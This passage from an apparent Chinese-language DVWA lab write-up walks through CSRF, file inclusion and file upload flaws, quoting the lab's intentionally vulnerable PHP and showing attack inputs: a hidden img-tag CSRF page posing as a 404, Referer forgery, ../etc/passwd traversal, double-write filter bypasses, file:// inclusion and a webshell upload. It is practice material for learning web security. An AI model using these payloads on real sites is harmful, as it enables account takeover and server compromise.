invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-3"><a href="#解决方法-3" class="headerlink" title="解决方法"></a>解决方法</h3><p>通过GET方式获取两次密码，两次密码输入一致的话，就可以直接带入数据中修改密码。</p>
<p>首先尝试修改为123456</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669690923307-0d36d043-8da4-41b1-8f26-fdd7dcc8342b.png" alt="img"></p>
<p>然后测试修改后的密码</p>
<p>发现修改成功</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669690955284-182e7abb-d2db-401c-beae-0dd82bdbb4f0.png" alt="img"></p>
<p>同时发现URL显示了我们输入要修改的密码</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/27996677/1669690991044-1bdd9c01-2936-4536-9dda-8b08b7a79bdc.png" alt="img"></p>
<p>在WWW目录下新建一个1.html，写入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/DVWA-master/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如此，当我们打开1.html时，密码就会被修改为123456（诱骗打开这个1.html）</p>
<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码解析-5"><a href="#源码解析-5" class="headerlink" title="源码解析"></a>源码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line"><span class="comment">//stripos(str1, str2)检查str2在str1中出现的位置（不区分大小写)，如果有返//回True，反之False</span></span><br><span class="line"><span class="comment">//判断Host字段是否出现在referer字段中</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line"> </span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-4"><a href="#解决方法-4" class="headerlink" title="解决方法"></a>解决方法</h3><p>加上了对用户请求头的中的Referer字段进行验证 即用户的请求头中的Referer字段必须包含了服务器的名字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false )</span><br></pre></td></tr></table></figure>

<p>所以就不能其他网页通过点开链接修改密码</p>
<p>需要伪造 referer </p>
<p>先正常访问dvwa  再抓包获取 referfer</p>
<p>先抓包</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669692438518-cfccaa6b-f208-4d3c-bc1e-f6361e958d59.png" alt="img"></p>
<p>可以看到有Referer头</p>
<p>再构造url：<a href="http://192.168.1.15:8080/dvwa/vulnerabilities/csrf/?password_new=12345678&amp;password_conf=12345678&amp;Change=Change#%E6%8A%93%E5%8C%85%E8%AE%BF%E9%97%AE">http://192.168.1.15:8080/dvwa/vulnerabilities/csrf/?password_new=12345678&amp;password_conf=12345678&amp;Change=Change#抓包访问</a></p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669692551253-1260f96a-d019-45ae-b328-6fc87edadd26.png" alt="img"></p>
<p>构造referer头</p>
<p>Referer:<a href="http://192.168.1.15:8080/dvwa/vulnerabilities/csrf/">http://192.168.1.15:8080/dvwa/vulnerabilities/csrf/</a>?.</p>
<p>放包即可</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>还不是很理解原理</p>
<h3 id="源码解析-6"><a href="#源码解析-6" class="headerlink" title="源码解析"></a>源码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"><span class="comment">//可以看到加入了token机制</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>相较于medium 增加了token 用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
<p>所以需要利用 xss漏洞获取token</p>
<h1 id="File-Inclusion（文件包含）"><a href="#File-Inclusion（文件包含）" class="headerlink" title="File Inclusion（文件包含）"></a>File Inclusion（文件包含）</h1><p>File Inclusion（文件包含），是指当服务器开启了allow_url_include选项时，通过一些PHP的特性函数（比如：include()，require()，include_once()和require_once()）利用URL去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</p>
<h3 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h3><p>本地文件包含：当被包含的文件在本地服务器时，就叫做本地文件包含</p>
<p>例：../../../../../etc/passwd</p>
<p>远程文件包含：当被包含的文件在第三方服务器时，就叫做远程文件包含</p>
<p>例：<a href="http://www.baidu.com/">http://www.baidu.com</a> 可以直接打开百度</p>
<h3 id="特性函数区别"><a href="#特性函数区别" class="headerlink" title="特性函数区别"></a>特性函数区别</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>()   当使用该函数包含文件时，只有代码执行到<span class="keyword">include</span>()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行</span><br><span class="line"><span class="keyword">include_once</span>()   功能和<span class="keyword">include</span>()相同，区别在于当重复调用同一文件时，程序只调用一次</span><br><span class="line"><span class="keyword">require</span>()   <span class="keyword">require</span>()与<span class="keyword">include</span>()的区别在于<span class="keyword">require</span>()执行如果发生错误，函数会输出错误信息，并终止脚本的运行 。使用<span class="keyword">require</span>()函数包含文件时，只要程序一执行，立即调用文件，而<span class="keyword">include</span>()只有程序执行到函数时才调用 .<span class="keyword">require</span>()在php程序执行前执行，会先读入 <span class="keyword">require</span> 所指定引入的文件，使它变成 PHP 程序网页的一部份。</span><br><span class="line"><span class="keyword">require_once</span>()   它的功能与<span class="keyword">require</span>()相同，区别在于当重复调用同一文件时，程序只调用一次</span><br></pre></td></tr></table></figure>

<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="源码解析-7"><a href="#源码解析-7" class="headerlink" title="源码解析"></a>源码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="comment">//直接获取page参数，未做任何过滤</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-5"><a href="#解决方法-5" class="headerlink" title="解决方法"></a>解决方法</h3><p>无任何过滤，直接本地文件包含</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669698848419-a1e78119-cdc7-41de-8be5-64032c1e2a7f.png" alt="img"></p>
<p>尝试远程文件包含</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669698926554-14029a88-1baf-4afe-9222-7da52b3f1c53.png" alt="img"></p>
<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="comment">//将参数中的http:// https:// ../ ..\都替换成空</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> 这个地方加了一些过滤，将“http://”，“https://”，“../”，“..\”全部替换成了空，这个地方其实可以考虑双写绕过。</p>
<h3 id="解决方法-6"><a href="#解决方法-6" class="headerlink" title="解决方法"></a>解决方法</h3><p>构造一个新的</p>
<p>ht<a href="http://tp//www.baidu.com">http://tp://www.baidu.com</a></p>
<p>过滤后</p>
<p><a href="http://www.baidu.com/">http://www.baidu.com</a></p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669699130570-b8d3af11-16f1-44a1-8021-8f5394ca62db.png" alt="img"></p>
<p>过滤前</p>
<p>…/./(….//)</p>
<p>过滤后</p>
<p>../</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669700354187-63744b2b-c757-413a-8aaf-c9db7a4cc61a.png" alt="img"></p>
<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="comment">//文件名必须以file开始，或只能为include.php</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">fnmatch</span>( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-7"><a href="#解决方法-7" class="headerlink" title="解决方法"></a>解决方法</h3><p>使用伪协议：file://  （访问本地文件系统）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">//		访问本地文件系统</span></span><br><span class="line">http:<span class="comment">//		访问 HTTPs 网址</span></span><br><span class="line">ftp:<span class="comment">//		访问 ftp URL </span></span><br><span class="line">Php:<span class="comment">//		访问输入输出流</span></span><br><span class="line">Zlib:<span class="comment">//		压缩流</span></span><br><span class="line">Data:<span class="comment">//		数据</span></span><br><span class="line">Ssh2:<span class="comment">//		security shell2 </span></span><br><span class="line">Expect:<span class="comment">//		处理交互式的流</span></span><br><span class="line">Glob:<span class="comment">//		查找匹配的文件路径</span></span><br></pre></td></tr></table></figure>

<p>伪协议后文件必须是绝对路径</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669701003131-15fc511a-b5db-447c-b1d7-5e2d30aa4202.png" alt="img"></p>
<p>参考文章</p>
<p><a href="https://blog.csdn.net/Wu000999/article/details/101925271">文件包含-伪协议_孤君的博客-CSDN博客</a></p>
<h1 id="File-Upload（文件上传）"><a href="#File-Upload（文件上传）" class="headerlink" title="File Upload（文件上传）"></a>File Upload（文件上传）</h1><p>File Upload（文件上传），由于对上传文件的内、类型没有做严格的过滤、检查，使得攻击者可以通过上传木马文件获取服务器的webshell文件。</p>
<h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><h3 id="源码解析-8"><a href="#源码解析-8" class="headerlink" title="源码解析"></a>源码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="comment">//文件的目标路径hackable/uploads/，也就是文件上传的位置</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line"><span class="comment">// basename(path,suffix)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。</span></span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="comment">//移动用户上传文件至目标路径</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解决方法-8"><a href="#解决方法-8" class="headerlink" title="解决方法"></a>解决方法</h3><p>从源码中可以看到对上传文件的类型、内容没有做任何的过滤与检查，同时告诉了我们文件上传的路径，存在明显的文件上传漏洞。</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669701527898-531d00aa-d4a2-422a-aa92-754a92c3905e.png" alt="img"></p>
<p>蚁剑连接</p>
<p><img src="/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/1669701544443-902caad8-38aa-4020-b77e-84f5a41c08c0.png" alt="img"></p>
<h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line"><span class="comment">//文件类型必须是image/jpeg 或者 image/png，大小不能超过100000B（约为97.6KB）</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG 